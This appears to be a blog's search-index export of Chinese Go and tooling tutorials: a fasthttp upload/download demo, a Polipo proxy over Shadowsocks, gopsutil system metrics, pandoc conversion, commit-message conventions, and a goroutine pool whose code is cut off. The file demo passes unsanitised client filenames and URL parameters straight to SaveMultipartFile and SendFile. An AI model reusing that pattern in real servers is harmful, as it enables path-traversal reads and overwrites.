"POST xyz=%s &lt;br/&gt;", postValues.Peek("xyz")) fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", bytes.Join(postValues.PeekMulti("xyz"), []byte(",")))&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 输出结果:1234GET abc=abc GET abc=abc,123 POST xyz=xyz POST xyz=xyz,123 文件处理fasthttp提供十分友好的接口, 通过FromFile读文件上传, 通过SendFile来提供下载,但是如果你想更加方便的定制一些信息,最好使用MultipartForm来获取上传对象1234567891011121314151617// MultipartForm returns requests's multipart form.//// Returns ErrNoMultipartForm if request's content-type// isn't 'multipart/form-data'.//// All uploaded temporary files are automatically deleted after// returning from RequestHandler. Either move or copy uploaded files// into new place if you want retaining them.//// Use SaveMultipartFile function for permanently saving uploaded file.//// The returned form is valid until returning from RequestHandler.//// See also FormFile and FormValue.func (ctx *RequestCtx) MultipartForm() (*multipart.Form, error) &#123; return ctx.Request.MultipartForm()&#125; MultipartForm 返回的是一个Form结构体, 我们在从源码中看看这个Form123456789// Form is a parsed multipart form.// Its File parts are stored either in memory or on disk,// and are accessible via the *FileHeader's Open method.// Its Value parts are stored as strings.// Both are keyed by field name.type Form struct &#123; Value map[string][]string File map[string][]*FileHeader&#125; 最好我们按照上面的分析实现了一个简单的下载和上传功能的小Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package mainimport ( "fmt" "html/template" "io" "log" "strconv" "time" "crypto/md5" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")// Hello Handlerfunc Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;// Index Handler, 默认的ContenType是text/plain, 输出的内容在pre标签里面// 因此这里必须手动设置ContentType为text/htmlfunc Index(ctx *fasthttp.RequestCtx) &#123; ctx.Response.Header.SetContentType("text/html") t := template.New("index.gtpl") t, _ = t.Parse(`&lt;html&gt; &lt;head&gt; &lt;title&gt;上传文件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype="multipart/form-data" action="/upload" method="post"&gt; &lt;input type="file" name="uploadfile" /&gt; &lt;input type="hidden" name="token" value="&#123;&#123;.&#125;&#125;"/&gt; &lt;input type="submit" value="upload" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;`) crutime := time.Now().Unix() h := md5.New() io.WriteString(h, strconv.FormatInt(crutime, 10)) token := fmt.Sprintf("%x", h.Sum(nil)) t.Execute(ctx, token)&#125;// UploadHandler is herefunc UploadHandler(ctx *fasthttp.RequestCtx) &#123; data, err := ctx.MultipartForm() if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("get upload file error:", err) return &#125; fileObj := data.File["uploadfile"][0] err = fasthttp.SaveMultipartFile(fileObj, fileObj.Filename) if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("save upload file error:", err) return &#125; ctx.Write([]byte("save file successfully!"))&#125;// DownloadHandler is herefunc DownloadHandler(ctx *fasthttp.RequestCtx) &#123; fileName := ctx.UserValue("filename") switch fileName := fileName.(type) &#123; case string: ctx.SendFile(fileName) default: ctx.SetStatusCode(500) fmt.Println("the filename is not string.") &#125;&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.POST("/upload", UploadHandler) router.GET("/download/:filename", DownloadHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用Polipo构建基于SS的http proxy]]></title>
      <url>%2F2017%2F01%2F24%2Fhttp-proxy%2F</url>
      <content type="text"><![CDATA[搞这个的主要原因是golang的很多依赖包需要翻墙下载, 这不像Python和NodeJS有官方源仓库的语言(配置国内源可以加速). 之前用windows的时候也是使用ss, 而http proxy是通过chrome的一个插件Proxy SwitchyOmega来做的，但是在mac下面这招不灵了, 下面主要介绍mac如何利用ss搭建http proxy. 安装Shadowsocksss的安装和运行是前提, 这里不多做介绍，具体请查看Shadowsocks安装和使用 Polipo简介这里主要使用Polipo来做http proxy, polipo的官方是这样介绍它的：“Polipo 是一个小而快速的缓存 web 代理程序(web 缓存, HTTP 代理, 代理服务器)。尽管 Polipo 是为一个人或一小群人使用而设计的，但并不妨碍它为一大群人所使用。”,该项目的地址 polipo Github地址, 该项目的官方文档polipo官方文档可惜该项目的作者已经停止该项目的维护了, 且用且珍惜。 Polipo安装Shadowsocks官方推荐http proxy代理也是Polipo, 官方对此也做了简单的描述，我直接抄过来了 安装123apt-get install poliposervice polipo stoppolipo socksParentProxy=localhost:1080 以上是官方文档里面的说明，在mac下使用polipo要稍做修改 mac的安装1brew install polipo Polipo使用 ss对polipo的使用样例 1234567891011http_proxy=http://localhost:8123 apt-get updatehttp_proxy=http://localhost:8123 curl www.google.comhttp_proxy=http://localhost:8123 wget www.google.comgit config --global http.proxy 127.0.0.1:8123git clone https://github.com/xxx/xxx.gitgit xxxgit xxxgit config --global --unset-all http.proxy mac的使用打开一个terminal, 不要关掉，象genymotion之类的其他程序就可使用Http代理了. 12➜ ~ polipo socksParentProxy=localhost:1080Established listening socket on port 8123. 然后我们使用使用该http proxy来安装golang包,记得开启的你的ss123456➜ Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttpgithub.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[夸平台系统监控库-gopsutils]]></title>
      <url>%2F2017%2F01%2F22%2Fgopsutils%2F</url>
      <content type="text"><![CDATA[很欣赏telegraf的架构,之前也多次使用, 最近也要通过他来获取系统运行时信息然后上传,所以想借鉴下telegraf里面的system模块的实现，看了下他的源码，发现他使用了一个名叫gopsutils库来完成所有的系统数据的采集的, 于是决定手动试试这个库的功能。 简介在说gopsutils之前我们必须先说下psutils是啥, 因为gopsutils实际上就是一个golang版本的psutils(从名字上也能看出来)psutils是一个比较出名的python库, psutils是python process and system utilities的一个缩写. 它有如下特点 跨平台: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSD的32位和64位系统 功能丰富: 实现了进程管理,系统诊断, 这个库基本实现了这些命令行工具的功能: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap 如果想要了解关于gopsutils更多的详情 请查看gopsutils github地址 安装1➜ gops_test go get -v &quot;github.com/shirou/gopsutil&quot; 使用具体的使用文档可以参考gopsutil的godoc文档以下以测试收集cpu, disk, load, mem, net, process 为列, 注意这些对象都使用String方法, 因此可以直接调用fmt打印，String方法会将其转换成Json输出.12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( "fmt" "github.com/shirou/gopsutil/cpu" "github.com/shirou/gopsutil/disk" "github.com/shirou/gopsutil/load" "github.com/shirou/gopsutil/mem" "github.com/shirou/gopsutil/net" "github.com/shirou/gopsutil/process")func main() &#123; fmt.Println("CPU统计:") c, _ := cpu.Info() fmt.Println(c) fmt.Println("内存统计:") m, _ := mem.VirtualMemory() fmt.Println(m) fmt.Println("磁盘用量和IO统计:") dp, _ := disk.Partitions(true) du, _ := disk.Usage("/") di, _ := disk.IOCounters() fmt.Println(du) fmt.Println(dp) fmt.Println(di) fmt.Println("网络IO统计:") ni, _ := net.IOCounters(true) fmt.Println(ni) fmt.Println("协议统计:") nt, _ := net.ProtoCounters(nil) fmt.Println(nt) fmt.Println("链接状态统计:") nc, _ := net.Connections("all") fmt.Println(nc) fmt.Println("进程统计:") pi, _ := process.Pids() fmt.Println(pi) p, _ := process.NewProcess(614) pm, _ := p.MemoryPercent() pn, _ := p.Username() fmt.Println(pm) fmt.Println(pn) fmt.Println("负载统计:") pl, _ := load.Avg() fmt.Println(pl)&#125; 最后执行过会的结果大概为这样:1234567891011121314151617181920CPU统计:[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]内存统计:&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;磁盘用量和IO统计:&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]map[]网络IO统计:[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]协议统计:[]链接状态统计:[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]进程统计:[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]0root负载统计:&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用pandoc将markdown文档转换成pdf]]></title>
      <url>%2F2017%2F01%2F19%2Fmarkdown-to-pdf%2F</url>
      <content type="text"><![CDATA[在公司做内部分享的时候往往用ppt, 写ppt的过程中往往还有比较多的代码示例, 通常的做法就是直接截图, 其实这对使用者来说是很不友好的, 而我之前一直使用markdown写博客, 比如我这个博客, 因此就想使用MarkDown来写分享的文档, 但是MarkDown的文档并不方便内部传阅, 因此想到了一个问题: 能否用MarkDown写, 然后转换成PDF, 给同事使用？于是问了下度娘, 果然找到了一个工具: Pandoc, 使用下来感觉不错, 在此分享一下使用方法, 也方便以后自己查阅。 简介Pandoc是一个用haskell编写的开源文本转换工具，小巧迅速且支持格式广泛，堪称文本转换应用的瑞士军刀。支持很多种输入输出，有关Pandoc可以在其官网进行详细了解。下载页面可以点此进入，在其中选择合适的版本即可（GitHub下载不多赘述), 至于详细的描述请看github上的说明。我这里主要使用 markdown—-&gt;pdf。 安装我这里仅介绍Mac下的安装, 需要安装pandoc和LaTeX其他平台官方有详尽的介绍, 具体请查看：pandoc官方安装文档 pandoc安装1$ brew install pandoc LaTeX安装因为我需要转换成pdf,还需要装LaTeX, 选一个Basic版本的安装即可, LaTeX的下载地址 使用简单的使用可以1$ pandoc -h 详细用法可以man查看，我这里直接给干活了,我使用庞房,这里记得选一种你系统上有的字体。1pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown -o Keystone.pdf 注意事项主要是Pandoc默认是对markDown语法有扩展，如果遇到转换后的效果和预期效果不一样, 还得阅读Pandoc扩展的MarkDown语法, 这篇博客对次介绍不错Pandoc中的markdown语法我这里仅列举一个我遇到的坑，当然如果你想使用标准的MarkDown语法，也可-f markdown_strict。 图片位置对应不上在markDown中插入的图片和Markdown里的不一样, 这里需要在图片后面添加一个\, 这样图片才不会换行, 这个在它扩展语法中有描述。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[commit message编写规范]]></title>
      <url>%2F2017%2F01%2F17%2Fcommit-message-style%2F</url>
      <content type="text"><![CDATA[Git每次提交代码，都要写Commit message(提交说明)，否则就不允许提交, Commit message往往会用于生成Change log文档, 规范的Commit message是一个高质量项目基本要求。社区有多种Commit message的写法规范。其中以国际知名项目AngularJS的规范使用最为广泛, 因为其比较合理和系统化,并且有相应的配套工具。 作用格式化得Commit message有很多好处 提供更多的历史信息，方便快速浏览 1234567$ git log &lt;last tag&gt; HEAD --pretty=format:%s添加testcase添加ignore格式添加py2支持补充entry_points添加测试环境文件添加tox测试相关文件 可以过滤某些commit（比如文档改动），便于快速查找信息 123456789101112131415git log HEAD --grep '添加'commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0Merge: 5fcae1d f5c5120Author: 紫川秀 &lt;719118794@qq.com&gt;Date: Mon Jan 9 19:13:47 2017 +0800 Merge pull request #1 from huang75961/master 添加tox测试commit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5Author: hc &lt;409438984@qq.com&gt;Date: Mon Jan 9 19:00:32 2017 +0800 添加testcase 可以直接从commit生成Change log 这个需要配合后面的工具使用 规范每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&lt;body&gt;&lt;footer&gt; 其中，Header 是必需的，Body 和 Footer 可以省略。不管是哪一个部分，任何一行都不得超过72个字符（或100个字符）。这是为了避免自动换行影响美观。 HeaderHeader部分只有一行，包括三个字段：type（必需）、scope（可选）和subject（必需）。 type用于说明commit的类别，只允许使用下面7个标识 feat：新功能（feature） fix：修补bug docs：文档（documentation） style： 格式（不影响代码运行的变动） refactor：重构（即不是新增功能，也不是修改bug的代码变动） test：增加测试 chore：构建过程或辅助工具的变动 如果type为feat和fix，则该commit将肯定出现在Change log之中。其他情况（docs、chore、style、refactor、test）由你决定，要不要放入Change log，建议是不要。 scopescope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同 subjectsubject是 commit 目的的简短描述，不超过50个字符。 以动词开头，使用第一人称现在时，比如change，而不是changed或changes 第一个字母小写 结尾不加句号（.） BodyBody 部分是对本次 commit 的详细描述，可以分成多行。但是有两个注意点。 使用第一人称现在时，比如使用change而不是changed或changes。 应该说明代码变动的动机，以及与以前行为的对比。下面是一个angular项目下面的一个范例。1234567891011Protractor users were having a problem where if they had asynchonous code in a`route.resolve` or `route.resolveRedirectTo` variable, Protractor was notwaiting for that code to complete before continuing. Seeangular/protractor#789 (comment) fordetails.This commit fixes it by ensuring that `$browser#outstandingRequestCount` isproperly increased/decreased while `$route` (asynchronously) processes a route.Also, enhanced `ngMock` to wait for pending requests, before calling callbacksfrom `$browser.notifyWhenNoOutstandingRequests()`. Footer该部分主要是用于变更过会的一些后续操作的, 比如关闭issue, 撤销之前的commit等 关闭Issue如果当前 commit 针对某个issue，那么可以在 Footer 部分关闭这个 issue 。也可以一次关闭多个issue 1Closes #112 1Closes #221, 222, 223 撤销之前的commit如果当前 commit 用于撤销以前的 commit，则必须以revert:开头，后面跟着被撤销 Commit 的 Header。Body部分的格式是固定的，必须写成This reverts commit hash.，其中的hash是被撤销 commit 的 SHA 标识符。如果当前 commit 与被撤销的 commit，在同一个发布（release）里面，那么它们都不会出现在 Change log 里面。如果两者在不同的发布，那么当前 commit，会出现在 Change log 的Reverts小标题下面。123revert: feat(pencil): add 'graphiteWidth' optionThis reverts commit 667ecc1654a317a13331b17617d973392f415f02. 不兼容变动如果当前代码与上一个版本不兼容，则 Footer 部分以BREAKING CHANGE开头，后面是对变动的描述、以及变动理由和迁移方法。1234567891011121314151617BREAKING CHANGE: isolate scope bindings definition has changed. To migrate the code follow the example below: Before: scope: &#123; myAttr: 'attribute', &#125; After: scope: &#123; myAttr: '@', &#125; The removed `inject` wasn't generaly useful for directives so there should be no code using it. 工具基于commit message有丰富的工具，包括编辑器，校验工具，以及生成Change log的工具 Commitizen编辑工具Commitizen是一个撰写合格 Commit message 的工具, 详细说明github地址 安装1) 全局安装(记得使用淘宝源来加速)123➜ ~ npm install -g commitizen➜ ~ npm install -g cz-conventional-changelogecho '&#123; "path": "cz-conventional-changelog" &#125;' &gt; ~/.czrc 2）局部安装12➜ ~ npm install commitizen -g➜ ~ commitizen init cz-conventional-changelog --save-dev --save-exact 主要如果报package.json不存在,需要添加这个文件, 这是nodejs的包管理文件, 格式可以参数commitizen包的package.json 使用123456789101112131415➜ device git:(master) ✗ git czcz-cli@2.9.5, cz-conventional-changelog@1.2.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you're committing: (Use arrow keys)❯ feat: A new feature fix: A bug fix docs: Documentation only changes style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc) refactor: A code change that neither fixes a bug nor adds a feature perf: A code change that improves performance test: Adding missing tests or correcting existing tests(Move up and down to reveal more choices) validate-commit-msg校验工具validate-commit-msg 用于检查 Node 项目的 Commit message 是否符合格式。我暂时不需要,github地址 生成Change log的工具conventional-changelog 就是生成 Change log 的工具，运行下面的命令即可。我已经使用setuptools的pbr来管理change log, 因此我咱不适用这个工具,关于pbr说明如果是其他项目可以考虑这个工具123$ npm install -g conventional-changelog$ cd my-project$ conventional-changelog -p angular -i CHANGELOG.md -w 上面命令不会覆盖以前的 Change log，只会在CHANGELOG.md的头部加上自从上次发布以来的变动。如果你想生成所有发布的 Change log，要改为运行下面的命令。1$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0 为了方便使用，可以将其写入package.json的scripts字段。1234&#123; "scripts": &#123; "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" &#125;&#125; 以后，直接运行下面的命令即可。1$ npm run changelog]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang并发编程-协程池]]></title>
      <url>%2F2017%2F01%2F12%2Fgoroutine-pool%2F</url>
      <content type="text"><![CDATA[在最近开发的项目中，后端需要编写许多提供HTTP接口的API，之所以选择Golang，主要是考虑到开发的模块，都需要接受瞬时大并发、、CPU密集型的分析任务、处理时间较长、无法同步立即返回结果的场景，Golang的goroutine以及channel所提供的语言层级的特性，正好可以满足这方面的需要 如何高并发并发模式下有很多问题需要我们关注, 因此我们设计出来的goroutine pool应该关注如下一些问题 goroutine的高并发goroutine的一个主要特性就是它们的消耗；创建它们的初始内存成本很低(与需要1至8MB内存的传统POSIX线程形成鲜明对比)以及根据需要动态增长和缩减占用的资源。这使得goroutine会从4096字节的初始栈内存占用开始按需增长或缩减内存占用, 在一般的需求下, 我们无需担心资源的耗尽。 Go语言通过系统的线程来多路派遣这些函数的执行，使得每个用go关键字执行的函数可以运行成为一个单位协程。当一个协程阻塞的时候，调度器就会自动把其他协程安排到另外的线程中去执行，从而实现了程序无等待并行化运行。而且调度的开销非常小，一颗CPU调度的规模不下于每秒百万次，这使得我们能够创建大量的goroutine，从而可以很轻松地编写高并发程序，达到我们想要的目的 简单来说：协程十分轻量，可以在一个进程中执行有数以十万计的协程，依旧保持高性能。 因此我们使用goroutine处理任务, 大概模型为：1234567891011121314151617package mainimport ( "fmt" "time")func say(s string) &#123; fmt.Println(s)&#125;func main() &#123; for _, word := range []string&#123;"hello", "world", "this", "is", "my", "goroutine", "test"&#125; &#123; go say(word) //开一个新的Goroutines执行 &#125; time.Sleep(time.Second * 1) // 等待goroutine跑完, 我为了方便使用了sleep的方式&#125; 利用协序池做并发控制虽然goroutine很便宜, 但也不是免费的, 总有一个时候你系统会扛不住，我们不能天真的对goroutine的数量不加限制的使用, 因此我们需要一种并发的限制机制来保证程序的稳定, 使得程序不会因为过多的goroutine而崩溃, 至于多少个goroutine 就需要根据自己环境测试得出。 如何对goroutine做并发限制喃？使用Java和C概念中的线程池来处理是个不错的方法，我们会使用Channel实现Queue+Worker模型, 整个过程：将请求都转发给一个channel，然后初始化多个goroutine读取这个channel中的内容，并进行处 避免接收Channel阻塞如果channel初始化时是没有设置长度的，此时如果协序池都满负荷工作，再有请求过来的话，仍然会出现被block的情况，而且会比没有经过优化的方案还要慢 遇到这种情况，我们应该希望模块能够及时告知调用方，“我已经达到处理极限了，无法给你处理请求了”。其实，这种需求，可以很简单的在Golang中实现：如果channel发送以及接收操作在select语句中执行并且发生阻塞，default语句就会立即执行。 接收执行结果我们既需要把结果发送给某个channel，获取到处理这次请求的结果。解决的方法是：将一个channel实例包含在请求中，goroutine处理完成后将结果写回这个channel 任务超时机制即使是复杂、耗时的任务，也必须设置超时时间。一方面可能是业务对此有时限要求（用户必须在XX分钟内看到结果），另一方面模块本身也不能都消耗在一直无法结束的任务上，使得其他请求无法得到正常处理。因此，也需要对处理流程增加超时机制。 我一般设置超时的方案是：和之前提到的“接收发送给channel之后返回的结果”结合起来，在等待返回channel的外层添加select，并在其中通过time.After()来判断超时 协程的优雅退出协序池里面的协序我们也需要优雅退出，解决方法很简单, 直接通过select监听一个退出channel, 等待外部通知, 好终止协程 实现协程池接下里我们将实现一个满足上述需求的Goroutine pool 流程图 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package mainimport "os"var ( // MaxWorker is the number of goroutine worker to start MaxWorker = os.Getenv("MAX_WORKERS") // MaxQueue is the job Queue buffered lenth MaxQueue = os.Getenv("MAX_QUEUE") // JobQueue is a buffered channel that we can send work requests on. JobQueue chan Job // WorkerPool is a pool of workers that are instantianted to perform the work WorkerPool chan chan Job)// Job represents the job to be runtype Job struct &#123; ID int task func()&#125;// Worker represents the worker that executes the jobtype Worker struct &#123; ID int InputQueue chan Job OutputQueue chan Result QuitQueue chan bool WorkerPool chan chan Job&#125;// Result use to collect the task resulttype Result struct &#123; JobID int Data interface&#123;&#125; Err error&#125;// GoroutinePool is a pool of workers channels that are registered with the GoroutinePooltype GoroutinePool struct &#123; maxWorkers int maxQueue int JobQueue chan Job ResultQueue chan Result WorkerPool chan chan Job&#125;// NewWorker is factory function to new a workerfunc NewWorker(id int, workerPool chan chan Job) *Worker &#123; worker := Worker&#123; ID: id, InputQueue: make(chan Job), OutputQueue: make(chan Result), WorkerPool: workerPool, QuitQueue: make(chan bool), &#125; return &amp;worker&#125;// Start method starts the run loop for the worker, listening for a quit channel// in case we need to stop itfunc (w 